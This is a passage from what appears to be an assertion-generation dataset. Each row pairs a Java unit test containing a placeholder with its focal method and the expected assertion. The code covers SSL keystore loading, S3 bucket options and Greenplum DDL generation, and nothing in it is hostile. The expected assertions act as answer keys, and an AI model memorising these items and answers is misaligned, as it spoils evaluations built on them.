createSslContext(final String keyStoreFilePath, final String keyStorePassword, final String privateKeyPassword) { final SSLContext sslContext;  try { final KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType()); keyStore.load(Files.newInputStream(Paths.get(keyStoreFilePath)), keyStorePassword.toCharArray());  final KeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm()); keyManagerFactory.init(keyStore, privateKeyPassword.toCharArray());  final TrustManagerFactory trustManagerFactory = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm()); trustManagerFactory.init(keyStore);  sslContext = SSLContext.getInstance(""TLS""); sslContext.init(keyManagerFactory.getKeyManagers(), trustManagerFactory.getTrustManagers(), null); } catch (Exception e) { throw new IllegalStateException(""Problem loading keystore to create SSLContext"", e); }  return sslContext; }"	"assertEquals(""TLS"", result.getProtocol())"
"testLoadP12KeyStoreWithDifferentPasswords() { SSLContext result = SslUtil.createSslContext(KEYSTORE_WITH_PASSWORDS, KEYSTORE_PASSWORD, PRIVATE_KEY_PASSWORD); ""<AssertPlaceHolder>""; }
createSslContext(final String keyStoreFilePath, final String keyStorePassword, final String privateKeyPassword) { final SSLContext sslContext;  try { final KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType()); keyStore.load(Files.newInputStream(Paths.get(keyStoreFilePath)), keyStorePassword.toCharArray());  final KeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm()); keyManagerFactory.init(keyStore, privateKeyPassword.toCharArray());  final TrustManagerFactory trustManagerFactory = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm()); trustManagerFactory.init(keyStore);  sslContext = SSLContext.getInstance(""TLS""); sslContext.init(keyManagerFactory.getKeyManagers(), trustManagerFactory.getTrustManagers(), null); } catch (Exception e) { throw new IllegalStateException(""Problem loading keystore to create SSLContext"", e); }  return sslContext; }"	"assertEquals(""TLS"", result.getProtocol())"
"testLoadP12KeyStoreWithIdenticalPasswords() { SSLContext result = SslUtil.createSslContext(KEYSTORE_WITH_IDENTICAL_PASSWORDS, KEYSTORE_PASSWORD, KEYSTORE_PASSWORD); ""<AssertPlaceHolder>""; }
createSslContext(final String keyStoreFilePath, final String keyStorePassword, final String privateKeyPassword) { final SSLContext sslContext;  try { final KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType()); keyStore.load(Files.newInputStream(Paths.get(keyStoreFilePath)), keyStorePassword.toCharArray());  final KeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm()); keyManagerFactory.init(keyStore, privateKeyPassword.toCharArray());  final TrustManagerFactory trustManagerFactory = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm()); trustManagerFactory.init(keyStore);  sslContext = SSLContext.getInstance(""TLS""); sslContext.init(keyManagerFactory.getKeyManagers(), trustManagerFactory.getTrustManagers(), null); } catch (Exception e) { throw new IllegalStateException(""Problem loading keystore to create SSLContext"", e); }  return sslContext; }"	"assertEquals(""TLS"", result.getProtocol())"
"IOException { S3SelectResponseHandler responseHandler = new S3SelectResponseHandler(); final RuntimeException exception = mock(RuntimeException.class); responseHandler.exceptionOccurred(exception); ""<AssertPlaceHolder>""; }
getException(){ return exception; }"	assertThat(responseHandler.getException(),equalTo(exception))
"JsonProcessingException { final String bucketOptionsYaml = ""---\nname: s3://test-s3-source-test-output""; final S3ScanBucketOption s3ScanBucketOption = objectMapper.readValue(bucketOptionsYaml, S3ScanBucketOption.class); ""<AssertPlaceHolder>""; }
getName() { if (name.startsWith(S3_PREFIX)) { return name.substring(S3_PREFIX.length()); } return name; }"	"assertThat(s3ScanBucketOption.getName(), equalTo(""test-s3-source-test-output""))"
"SQLException { SQLDatabasePersistAction regularTableDropTableQuery = new SQLDatabasePersistAction(""Drop table"", ""DROP TABLE foo.bar"");  Mockito.when(mockSchema.getName()).thenReturn(""foo""); Mockito.when(mockResults.getString(""relname"")).thenReturn(""bar""); GreenplumTable greenplumTable = new GreenplumTable(mockSchema, mockResults);  SQLDatabasePersistAction sqlDatabasePersistAction = greenplumTableManager.createDeleteAction(greenplumTable, Collections.emptyMap());  Assert.""<AssertPlaceHolder>""; }
createDeleteAction(T table, Map<String, Object> options) { StringBuilder dropTableScript = new StringBuilder(""DROP "") .append((table instanceof PostgreTableForeign ? ""FOREIGN "" : """")) .append(""TABLE "") .append(table.getFullyQualifiedName(DBPEvaluationContext.DDL)) .append((CommonUtils.getOption(options, OPTION_DELETE_CASCADE) ? "" CASCADE"" : """"));  return new SQLDatabasePersistAction(ModelMessages.model_jdbc_drop_table, dropTableScript.toString()); }"	assertEquals(regularTableDropTableQuery.getScript(), sqlDatabasePersistAction.getScript())
"SQLException { SQLDatabasePersistAction regularTableDropTableQuery = new SQLDatabasePersistAction(""Drop table"", ""DROP FOREIGN TABLE foo.bar"");  Mockito.when(mockSchema.getName()).thenReturn(""foo""); Mockito.when(mockResults.getString(""relname"")).thenReturn(""bar"");  PostgreTableForeign postgreForeignTable = new PostgreTableForeign(mockSchema, mockResults);  SQLDatabasePersistAction sqlDatabasePersistAction = greenplumTableManager.createDeleteAction(postgreForeignTable, Collections.emptyMap());  Assert.""<AssertPlaceHolder>""; }
createDeleteAction(T table, Map<String, Object> options) { StringBuilder dropTableScript = new StringBuilder(""DROP "") .append((table instanceof PostgreTableForeign ? ""FOREIGN "" : """")) .append(""TABLE "") .append(table.getFullyQualifiedName(DBPEvaluationContext.DDL)) .append((CommonUtils.getOption(options, OPTION_DELETE_CASCADE) ? "" CASCADE"" : """"));  return new SQLDatabasePersistAction(ModelMessages.model_jdbc_drop_table, dropTableScript.toString()); }"	assertEquals(regularTableDropTableQuery.getScript(), sqlDatabasePersistAction.getScript())
"onCreation_whenNoInitialDbResultIsProvided_thenDefaultEncodingIsSetToUTF8() { GreenplumExternalTable table = new GreenplumExternalTable(mockSchema); Assert.""<AssertPlaceHolder>""; }
getEncoding() { return encoding; }"	"assertEquals(""UTF8"", table.getEncoding())"
"onCreation_whenNoInitialDbResultIsProvided_thenDefaultFormatIsText() { GreenplumExternalTable table = new GreenplumExternalTable(mockSchema); Assert.""<AssertPlaceHolder>""; }
getFormatType() { if (this.formatType == null) { return null; } else { return this.formatType.getValue(); } }"	"assertEquals(""TEXT"", table.getFormatType())"
"onCreation_whenNoInitialDbResultIsProvided_thenDefaultFormatOptionsAreBasedOnTextFormatType() { GreenplumExternalTable table = new GreenplumExternalTable(mockSchema); Assert.""<AssertPlaceHolder>""; }
getFormatOptions() { return formatOptions; }"	"assertEquals(""delimiter ',' null '' escape '""' quote '""' header"", table.getFormatOptions())"
"SQLException { Mockito.when(mockResults.getString(""urilocation"")).thenReturn(""SOME_EXTERNAL_LOCATION""); GreenplumExternalTable table = new GreenplumExternalTable(mockSchema, mockResults); Assert.""<AssertPlaceHolder>""; }
getUriLocations() { return this.uriLocationsHandler.getCommaSeparatedList(); }"	"assertEquals(""SOME_EXTERNAL_LOCATION"", table.getUriLocations())"
"SQLException { Mockito.when(mockResults.getString(""urilocation"")) .thenReturn(""SOME_EXTERNAL_LOCATION,ANOTHER_EXTERNAL_LOCATION""); GreenplumExternalTable table = new GreenplumExternalTable(mockSchema, mockResults); Assert.""<AssertPlaceHolder>""; }
getUriLocations() { return this.uriLocationsHandler.getCommaSeparatedList(); }"	"assertEquals(""SOME_EXTERNAL_LOCATION,ANOTHER_EXTERNAL_LOCATION"", table.getUriLocations())"
"SQLException { Mockito.when(mockResults.getString(""urilocation"")).thenReturn(""""); GreenplumExternalTable table = new GreenplumExternalTable(mockSchema, mockResults); Assert.""<AssertPlaceHolder>""; }
getUriLocations() { return this.uriLocationsHandler.getCommaSeparatedList(); }"	assertTrue(table.getUriLocations().isEmpty())
"SQLException { Mockito.when(mockResults.getString(""execlocation"")).thenReturn(""ALL_SEGMENTS""); GreenplumExternalTable table = new GreenplumExternalTable(mockSchema, mockResults); String expectedUriLocation = ""ALL_SEGMENTS""; Assert.""<AssertPlaceHolder>""; }
getExecLocation() { return execLocation; }"	assertEquals(expectedUriLocation, table.getExecLocation())
"SQLException { Mockito.when(mockResults.getString(""fmttype"")).thenReturn(""t""); GreenplumExternalTable table = new GreenplumExternalTable(mockSchema, mockResults); Assert.""<AssertPlaceHolder>""; }
getFormatType() { if (this.formatType == null) { return null; } else { return this.formatType.getValue(); } }"	"assertEquals(""TEXT"", table.getFormatType())"
"SQLException { Mockito.when(mockResults.getString(""fmtopts"")) .thenReturn(""delimiter ',' null '' escape '""' quote '""' header""); GreenplumExternalTable table = new GreenplumExternalTable(mockSchema, mockResults); String expectedUriLocation = ""delimiter ',' null '' escape '""' quote '""' header""; Assert.""<AssertPlaceHolder>""; }
getFormatOptions() { return formatOptions; }"	assertEquals(expectedUriLocation, table.getFormatOptions())
"SQLException { Mockito.when(mockResults.getString(""encoding"")).thenReturn(""UTF8""); GreenplumExternalTable table = new GreenplumExternalTable(mockSchema, mockResults); String expectedUriLocation = ""UTF8""; Assert.""<AssertPlaceHolder>""; }
getEncoding() { return encoding; }"	assertEquals(expectedUriLocation, table.getEncoding())
"SQLException { Mockito.when(mockResults.getString(""rejectlimittype"")).thenReturn(""r""); GreenplumExternalTable table = new GreenplumExternalTable(mockSchema, mockResults); Assert.""<AssertPlaceHolder>""; }
getRejectLimitType() { return rejectLimitType; }"	assertEquals(GreenplumExternalTable.RejectLimitType.r, table.getRejectLimitType())
"SQLException { Mockito.when(mockResults.getInt(""rejectlimit"")).thenReturn(50_000); GreenplumExternalTable table = new GreenplumExternalTable(mockSchema, mockResults); int expectedUriLocation = 50_000; Assert.""<AssertPlaceHolder>""; }
getRejectLimit() { return rejectLimit; }"	assertEquals(expectedUriLocation, table.getRejectLimit())
"SQLException { Mockito.when(mockResults.getBoolean(""writable"")).thenReturn(true); GreenplumExternalTable table = new GreenplumExternalTable(mockSchema, mockResults); Assert.""<AssertPlaceHolder>""; }
isWritable() { return writable; }"	assertTrue(table.isWritable())
"SQLException { Mockito.when(mockResults.getBoolean(""is_temp_table"")).thenReturn(true); GreenplumExternalTable table = new GreenplumExternalTable(mockSchema, mockResults); Assert.""<AssertPlaceHolder>""; }
isTemporaryTable() { return temporaryTable; }"	assertTrue(table.isTemporaryTable())
"SQLException { Mockito.when(mockResults.getBoolean(""is_logging_errors"")).thenReturn(true); GreenplumExternalTable table = new GreenplumExternalTable(mockSchema, mockResults); Assert.""<AssertPlaceHolder>""; }
isLoggingErrors() { return loggingErrors; }"	assertTrue(table.isLoggingErrors())
"SQLException { // Greenplum 6 runs on Postgre 9.4.x Mockito.when(mockDataSource.isServerVersionAtLeast(9,4)).thenReturn(true); GreenplumExternalTable table = new GreenplumExternalTable(mockSchema, mockResults); Assert.""<AssertPlaceHolder>""; Mockito.verify(mockResults, Mockito.times(0)).getBoolean(""is_logging_errors""); }
isLoggingErrors() { return loggingErrors; }"	assertFalse(table.isLoggingErrors())
"DBException { PostgreTableColumn mockPostgreTableColumn = mockDbColumn(""column1"", ""int4"", 1); List<PostgreTableColumn> tableColumns = Collections.singletonList(mockPostgreTableColumn);  Mockito.when(mockResults.getString(""command"")).thenReturn(""execute something""); Mockito.when(mockResults.getString(""urilocation"")).thenReturn(""""); Mockito.when(mockResults.getString(""fmttype"")).thenReturn(""t""); Mockito.when(mockResults.getString(""fmtopts"")).thenReturn("""");  GreenplumExternalTable table = new GreenplumExternalTable(mockSchema, mockResults); addMockColumnsToTableCache(tableColumns, table);  String expectedDDL = ""CREATE EXTERNAL WEB TABLE sampleDatabase.sampleSchema.sampleTable (\n\tcolumn1 int4\n)\n"" + ""EXECUTE 'execute something' ON ALL\n"" + ""FORMAT 'TEXT'\n"" + ""ENCODING 'UTF8'"";  Assert.""<AssertPlaceHolder>""; }
generateDDL(DBRProgressMonitor monitor) throws DBException { StringBuilder ddlBuilder = new StringBuilder(); ddlBuilder.append(""CREATE "") .append(this.isWritable() ? ""WRITABLE "" : """") .append(""EXTERNAL "") .append(isWebTable() ? ""WEB "" : """") .append(this.isTemporaryTable() ? ""TEMPORARY "" : """") .append(""TABLE "") .append(addDatabaseQualifier()) .append(this.getName()) .append("" (\n"");  List<PostgreTableColumn> tableColumns = filterOutNonMetadataColumns(monitor);  if (tableColumns.size() == 0) { ddlBuilder.append(""\n)\n""); } else if (tableColumns.size() == 1) { PostgreTableColumn column = tableColumns.get(0); ddlBuilder.append(""\t"").append(column.getName()).append("" "").append(column.getTypeName()).append(""\n)\n""); } else { ddlBuilder.append(tableColumns .stream() .map(field -> ""\t"" + field.getName() + "" "" + field.getTypeName()) .collect(Collectors.joining("",\n""))); ddlBuilder.append(""\n)\n""); }  if (CommonUtils.isNotEmpty(this.getUriLocations())) { ddlBuilder.append(""LOCATION (\n"");  ddlBuilder.append(this.uriLocationsHandler .stream() .map(location -> ""\t'"" + location + ""'"") .collect(Collectors.joining("",\n"")));  ddlBuilder.append(""\n) "").append(determineExecutionLocation()).append(""\n""); } else if (tableHasCommand()) { ddlBuilder.append(""EXECUTE '"").append(this.getCommand()).append(""' "").append(determineExecutionLocation()).append(""\n""); }  ddlBuilder.append(""FORMAT '"").append(this.getFormatType()).append(""'"");  if(this.getFormatOptions() != null) { ddlBuilder.append(generateFormatOptions(this.formatType, this.getFormatOptions())); }  if (this.getEncoding() != null && this.getEncoding().length() > 0) { ddlBuilder.append(""\nENCODING '"").append(this.getEncoding()).append(""'""); }  if (this.isLoggingErrors()) { ddlBuilder.append(""\nLOG ERRORS""); }  if (this.getRejectLimit() > 0 && this.getRejectLimitType() != null) { ddlBuilder.append(this.isLoggingErrors() ? "" "" : ""\n"") .append(""SEGMENT REJECT LIMIT "") .append(this.getRejectLimit()) .append("" "") .append(this.getRejectLimitType().getValue()); }  return ddlBuilder.toString(); }"	assertEquals(expectedDDL, table.generateDDL(monitor))
"DBException { PostgreTableColumn mockPostgreTableColumn = mockDbColumn(""column1"", ""int4"", 1); List<PostgreTableColumn> tableColumns = Collections.singletonList(mockPostgreTableColumn);  Mockito.when(mockResults.getString(""command"")).thenReturn(""execute something""); Mockito.when(mockResults.getString(""urilocation"")).thenReturn(""""); Mockito.when(mockResults.getString(""fmttype"")).thenReturn(""t""); Mockito.when(mockResults.getString(""fmtopts"")).thenReturn(""""); Mockito.when(mockResults.getString(""execlocation"")).thenReturn(""MASTER_ONLY"");  GreenplumExternalTable table = new GreenplumExternalTable(mockSchema, mockResults); addMockColumnsToTableCache(tableColumns, table);  String expectedDDL = ""CREATE EXTERNAL WEB TABLE sampleDatabase.sampleSchema.sampleTable (\n\tcolumn1 int4\n)\n"" + ""EXECUTE 'execute something' ON MASTER\n"" + ""FORMAT 'TEXT'\n"" + ""ENCODING 'UTF8'"";  Assert.""<AssertPlaceHolder>""; }
generateDDL(DBRProgressMonitor monitor) throws DBException { StringBuilder ddlBuilder = new StringBuilder(); ddlBuilder.append(""CREATE "") .append(this.isWritable() ? ""WRITABLE "" : """") .append(""EXTERNAL "") .append(isWebTable() ? ""WEB "" : """") .append(this.isTemporaryTable() ? ""TEMPORARY "" : """") .append(""TABLE "") .append(addDatabaseQualifier()) .append(this.getName()) .append("" (\n"");  List<PostgreTableColumn> tableColumns = filterOutNonMetadataColumns(monitor);  if (tableColumns.size() == 0) { ddlBuilder.append(""\n)\n""); } else if (tableColumns.size() == 1) { PostgreTableColumn column = tableColumns.get(0); ddlBuilder.append(""\t"").append(column.getName()).append("" "").append(column.getTypeName()).append(""\n)\n""); } else { ddlBuilder.append(tableColumns .stream() .map(field -> ""\t"" + field.getName() + "" "" + field.getTypeName()) .collect(Collectors.joining("",\n""))); ddlBuilder.append(""\n)\n""); }  if (CommonUtils.isNotEmpty(this.getUriLocations())) { ddlBuilder.append(""LOCATION (\n"");  ddlBuilder.append(this.uriLocationsHandler .stream() .map(location -> ""\t'"" + location + ""'"") .collect(Collectors.joining("",\n"")));  ddlBuilder.append(""\n) "").append(determineExecutionLocation()).append(""\n""); } else if (tableHasCommand()) { ddlBuilder.append(""EXECUTE '"").append(this.getCommand()).append(""' "").append(determineExecutionLocation()).append(""\n""); }  ddlBuilder.append(""FORMAT '"").append(this.getFormatType()).append(""'"");  if(this.getFormatOptions() != null) { ddlBuilder.append(generateFormatOptions(this.formatType, this.getFormatOptions())); }  if (this.getEncoding() != null && this.getEncoding().length() > 0) { ddlBuilder.append(""\nENCODING '"").append(this.getEncoding()).append(""'""); }  if (this.isLoggingErrors()) { ddlBuilder.append(""\nLOG ERRORS""); }  if (this.getRejectLimit() > 0 && this.getRejectLimitType() != null) { ddlBuilder.append(this.isLoggingErrors() ? "" "" : ""\n"") .append(""SEGMENT REJECT LIMIT "") .append(this.getRejectLimit()) .append("" "") .append(this.getRejectLimitType().getValue()); }  return ddlBuilder.toString(); }"	assertEquals(expectedDDL, table.generateDDL(monitor))
"setFormatType_whenProvidedAValidStringRepresentationOfFormatType_setsFormatTypeEnumSuccessfully() { GreenplumExternalTable table = new GreenplumExternalTable(mockSchema); table.setFormatType(""CUSTOM""); Assert.""<AssertPlaceHolder>""; }
getFormatType() { if (this.formatType == null) { return null; } else { return this.formatType.getValue(); } }"	"assertEquals(""CUSTOM"", table.getFormatType())"
"getCommaSeparatedList_whenConstructedWithALineFeedSeparatedListOfLocations_shouldReturnCommaSeparatedString() { GreenplumExternalTableUriLocationsHandler handler = new GreenplumExternalTableUriLocationsHandler(""location1\nlocation2"", '\n'); Assert.""<AssertPlaceHolder>""; }
getCommaSeparatedList() { return CommonUtils.joinStrings("","", this.uriLocations); }"	"assertEquals(""location1,location2"", handler.getCommaSeparatedList())"
"getLineFeedSeparatedList_whenConstructedWithALineFeedSeparatedListOfLocations_shouldReturnLineFeedSeparatedString() { GreenplumExternalTableUriLocationsHandler handler = new GreenplumExternalTableUriLocationsHandler(""location1\nlocation2"", '\n'); Assert.""<AssertPlaceHolder>""; }
getLineFeedSeparatedList() { return CommonUtils.joinStrings(""\n"", this.uriLocations); }"	"assertEquals(""location1\nlocation2"", handler.getLineFeedSeparatedList())"
"onCreation_whenGreenplumVersionIsSixAndAbove_thenExecutionLocationDefaultsToANY() { withGreenplumVersion6AndAbove(() -> { GreenplumFunction function = new GreenplumFunction(mockSchema); Assert.""<AssertPlaceHolder>""; }); }
getExecutionLocation() { return executionLocation; }"	assertEquals(GreenplumFunction.FunctionExecLocation.a, function.getExecutionLocation())
"onCreation_whenGreenplumVersionIsBelowSix_thenExecutionLocationIsNotSet() { withGreenplumVersionLessThan6(() -> { GreenplumFunction function = new GreenplumFunction(mockSchema); Assert.""<AssertPlaceHolder>""; }); }
getExecutionLocation() { return executionLocation; }"	assertNull(function.getExecutionLocation())
"Exception { StringBuilder ddl = new StringBuilder();  JDBCResultSet mockDCResults = mockResults(mockMonitor); Mockito.when(mockDCResults.next()).thenReturn(false);  List<PostgreTableConstraint> constraints = Collections.emptyList();  table = new GreenplumTable(mockSchema, mockResults);  Mockito.when(mockConstraintCache.getTypedObjects(mockMonitor, mockSchema, table, PostgreTableConstraint.class)) .thenReturn(constraints);  table.appendTableModifiers(mockMonitor, ddl);  Assert.""<AssertPlaceHolder>""; }
appendTableModifiers(DBRProgressMonitor monitor, StringBuilder ddl) { try { List<PostgreTableColumn> distributionColumns = getDistributionPolicy(monitor); if (CommonUtils.isEmpty(distributionColumns)) { distributionColumns = getDistributionTableColumns(monitor, distributionColumns); }  ddl.append(""\nDISTRIBUTED ""); if (CommonUtils.isEmpty(distributionColumns)) { ddl.append((supportsReplicatedDistribution && isPersisted() && isDistributedByReplicated(monitor)) ? ""REPLICATED"" : ""RANDOMLY""); } else { ddl.append(""BY (""); for (int i = 0; i < distributionColumns.size(); i++) { if (i > 0) ddl.append("", ""); ddl.append(DBUtils.getQuotedIdentifier(distributionColumns.get(i))); } ddl.append("")""); }  String partitionData = isPersisted() ? getPartitionData(monitor) : null; if (partitionData != null) { ddl.append(""\n""); ddl.append(partitionData); } } catch (DBException e) { log.error(""Error reading Greenplum table properties"", e); } }"	"assertEquals(""\nDISTRIBUTED RANDOMLY"", ddl.toString())"
"Exception { StringBuilder ddl = new StringBuilder();  JDBCResultSet mockDCResults = mockResults(mockMonitor); Mockito.when(mockDCResults.next()).thenReturn(true); Mockito.when(mockDCResults.getObject(1)).thenReturn(new int[]{1});  List<PostgreTableColumn> mockColumns = createMockColumns(""Column_Name"");  Mockito.when(mockSchema.getTableCache()).thenReturn(mockTableCache);  table = new GreenplumTable(mockSchema, mockResults); Mockito.when(mockTableCache.getChildren(mockMonitor, mockSchema, table)) .thenReturn(mockColumns);  table.appendTableModifiers(mockMonitor, ddl);  Assert.""<AssertPlaceHolder>""; }
appendTableModifiers(DBRProgressMonitor monitor, StringBuilder ddl) { try { List<PostgreTableColumn> distributionColumns = getDistributionPolicy(monitor); if (CommonUtils.isEmpty(distributionColumns)) { distributionColumns = getDistributionTableColumns(monitor, distributionColumns); }  ddl.append(""\nDISTRIBUTED ""); if (CommonUtils.isEmpty(distributionColumns)) { ddl.append((supportsReplicatedDistribution && isPersisted() && isDistributedByReplicated(monitor)) ? ""REPLICATED"" : ""RANDOMLY""); } else { ddl.append(""BY (""); for (int i = 0; i < distributionColumns.size(); i++) { if (i > 0) ddl.append("", ""); ddl.append(DBUtils.getQuotedIdentifier(distributionColumns.get(i))); } ddl.append("")""); }  String partitionData = isPersisted() ? getPartitionData(monitor) : null; if (partitionData != null) { ddl.append(""\n""); ddl.append(partitionData); } } catch (DBException e) { log.error(""Error reading Greenplum table properties"", e); } }"	"assertEquals(""\nDISTRIBUTED BY (Column_Name)"", ddl.toString())"
"Exception { StringBuilder ddl = new StringBuilder();  JDBCResultSet mockDCResults = mockResults(mockMonitor); Mockito.when(mockDCResults.next()).thenReturn(true); Mockito.when(mockDCResults.getObject(1)).thenReturn(new int[]{1, 2});  List<PostgreTableColumn> mockColumns = createMockColumns(""Column_1"", ""Column_2"");  Mockito.when(mockSchema.getTableCache()).thenReturn(mockTableCache);  table = new GreenplumTable(mockSchema, mockResults);  Mockito.when(mockTableCache.getChildren(mockMonitor, mockSchema, table)) .thenReturn(mockColumns);  table.appendTableModifiers(mockMonitor, ddl);  Assert.""<AssertPlaceHolder>""; }
appendTableModifiers(DBRProgressMonitor monitor, StringBuilder ddl) { try { List<PostgreTableColumn> distributionColumns = getDistributionPolicy(monitor); if (CommonUtils.isEmpty(distributionColumns)) { distributionColumns = getDistributionTableColumns(monitor, distributionColumns); }  ddl.append(""\nDISTRIBUTED ""); if (CommonUtils.isEmpty(distributionColumns)) { ddl.append((supportsReplicatedDistribution && isPersisted() && isDistributedByReplicated(monitor)) ? ""REPLICATED"" : ""RANDOMLY""); } else { ddl.append(""BY (""); for (int i = 0; i < distributionColumns.size(); i++) { if (i > 0) ddl.append("", ""); ddl.append(DBUtils.getQuotedIdentifier(distributionColumns.get(i))); } ddl.append("")""); }  String partitionData = isPersisted() ? getPartitionData(monitor) : null; if (partitionData != null) { ddl.append(""\n""); ddl.append(partitionData); } } catch (DBException e) { log.error(""Error reading Greenplum table properties"", e); } }"	"assertEquals(""\nDISTRIBUTED BY (Column_1, Column_2)"", ddl.toString())"
"Exception { StringBuilder ddl = new StringBuilder();  JDBCResultSet mockDCResults = mockResults(mockMonitor); Mockito.when(mockDCResults.next()).thenReturn(false, true); Mockito.when(mockDCResults.getString(1)).thenReturn(""x"");  Mockito.when(mockDataSource.isServerVersionAtLeast(Mockito.anyInt(), Mockito.anyInt())).thenReturn(true);  table = new GreenplumTable(mockSchema, mockResults);  table.appendTableModifiers(mockMonitor, ddl);  Assert.""<AssertPlaceHolder>""; }
appendTableModifiers(DBRProgressMonitor monitor, StringBuilder ddl) { try { List<PostgreTableColumn> distributionColumns = getDistributionPolicy(monitor); if (CommonUtils.isEmpty(distributionColumns)) { distributionColumns = getDistributionTableColumns(monitor, distributionColumns); }  ddl.append(""\nDISTRIBUTED ""); if (CommonUtils.isEmpty(distributionColumns)) { ddl.append((supportsReplicatedDistribution && isPersisted() && isDistributedByReplicated(monitor)) ? ""REPLICATED"" : ""RANDOMLY""); } else { ddl.append(""BY (""); for (int i = 0; i < distributionColumns.size(); i++) { if (i > 0) ddl.append("", ""); ddl.append(DBUtils.getQuotedIdentifier(distributionColumns.get(i))); } ddl.append("")""); }  String partitionData = isPersisted() ? getPartitionData(monitor) : null; if (partitionData != null) { ddl.append(""\n""); ddl.append(partitionData); } } catch (DBException e) { log.error(""Error reading Greenplum table properties"", e); } }"	"assertEquals(""\nDISTRIBUTED RANDOMLY"", ddl.toString())"
"Exception { StringBuilder ddl = new StringBuilder();  JDBCResultSet mockDCResults = mockResults(mockMonitor); Mockito.when(mockDCResults.next()).thenReturn(false, true); Mockito.when(mockDCResults.getString(1)).thenReturn(""r"");  Mockito.when(mockDataSource.isServerVersionAtLeast(Mockito.anyInt(), Mockito.anyInt())).thenReturn(true);  table = new GreenplumTable(mockSchema, mockResults);  table.appendTableModifiers(mockMonitor, ddl);  Assert.""<AssertPlaceHolder>""; }
appendTableModifiers(DBRProgressMonitor monitor, StringBuilder ddl) { try { List<PostgreTableColumn> distributionColumns = getDistributionPolicy(monitor); if (CommonUtils.isEmpty(distributionColumns)) { distributionColumns = getDistributionTableColumns(monitor, distributionColumns); }  ddl.append(""\nDISTRIBUTED ""); if (CommonUtils.isEmpty(distributionColumns)) { ddl.append((supportsReplicatedDistribution && isPersisted() && isDistributedByReplicated(monitor)) ? ""REPLICATED"" : ""RANDOMLY""); } else { ddl.append(""BY (""); for (int i = 0; i < distributionColumns.size(); i++) { if (i > 0) ddl.append("", ""); ddl.append(DBUtils.getQuotedIdentifier(distributionColumns.get(i))); } ddl.append("")""); }  String partitionData = isPersisted() ? getPartitionData(monitor) : null; if (partitionData != null) { ddl.append(""\n""); ddl.append(partitionData); } } catch (DBException e) { log.error(""Error reading Greenplum table properties"", e); } }"	"assertEquals(""\nDISTRIBUTED REPLICATED"", ddl.toString())"
"generateWithClause_whenTableWithoutOidsAndWithOptions_shouldDisplayWithClauseWithRelOptions() {  setupGeneralWhenMocks(false, false);  when(tableBase.getRelOptions()).thenReturn(new String[]{""appendonly=true""});  String withClause = generateWithClause(table, tableBase); ""<AssertPlaceHolder>""; }
generateWithClause(PostgreTable table, PostgreTableBase tableBase) { StringBuilder withClauseBuilder = new StringBuilder();  if (tableSupportsAndHasOids(table) && tableIsGreenplumWithRelOptions(table, tableBase)) { withClauseBuilder.append(""\nWITH (\n\tOIDS="").append(table.isHasOids() ? ""TRUE"" : ""FALSE""); for (String option : tableBase.getRelOptions()) { withClauseBuilder.append(format("",\n\t%s"", option)); } withClauseBuilder.append(""\n)""); } else if (tableSupportsAndHasOids(table)) { withClauseBuilder.append(""\nWITH (\n\tOIDS="").append(table.isHasOids() ? ""TRUE"" : ""FALSE""); withClauseBuilder.append(""\n)""); } else if (tableIsGreenplumWithRelOptions(table, tableBase)) { String[] options = tableBase.getRelOptions(); withClauseBuilder.append(format(""\nWITH (\n\t%s"", options[0])); for (int i = 1; i < options.length; i++) { String option = options[i]; withClauseBuilder.append(format("",\n\t%s"", option)); } withClauseBuilder.append(""\n)""); }  return withClauseBuilder.toString(); }"	"assertEquals(""\nWITH (\n\tappendonly=true\n)"", withClause)"
"generateWithClause_whenTableWithOidsAndOptions_shouldDisplayWithClauseWithOidsAndOptions() {  setupGeneralWhenMocks(true, true);  when(tableBase.getRelOptions()).thenReturn(new String[]{""appendonly=true""});  String withClause = generateWithClause(table, tableBase); ""<AssertPlaceHolder>""; }
generateWithClause(PostgreTable table, PostgreTableBase tableBase) { StringBuilder withClauseBuilder = new StringBuilder();  if (tableSupportsAndHasOids(table) && tableIsGreenplumWithRelOptions(table, tableBase)) { withClauseBuilder.append(""\nWITH (\n\tOIDS="").append(table.isHasOids() ? ""TRUE"" : ""FALSE""); for (String option : tableBase.getRelOptions()) { withClauseBuilder.append(format("",\n\t%s"", option)); } withClauseBuilder.append(""\n)""); } else if (tableSupportsAndHasOids(table)) { withClauseBuilder.append(""\nWITH (\n\tOIDS="").append(table.isHasOids() ? ""TRUE"" : ""FALSE""); withClauseBuilder.append(""\n)""); } else if (tableIsGreenplumWithRelOptions(table, tableBase)) { String[] options = tableBase.getRelOptions(); withClauseBuilder.append(format(""\nWITH (\n\t%s"", options[0])); for (int i = 1; i < options.length; i++) { String option = options[i]; withClauseBuilder.append(format("",\n\t%s"", option)); } withClauseBuilder.append(""\n)""); }  return withClauseBuilder.toString(); }"	"assertEquals(""\nWITH (\n\tOIDS=TRUE,\n\tappendonly=true\n)"", withClause)"
"generateWithClause_whenTableWithoutOidsAndWithoutOptions_shouldNotDisplayWithClause() {  setupGeneralWhenMocks(false, false);  when(tableBase.getRelOptions()).thenReturn(null);  String withClause = generateWithClause(table, tableBase); ""<AssertPlaceHolder>""; }
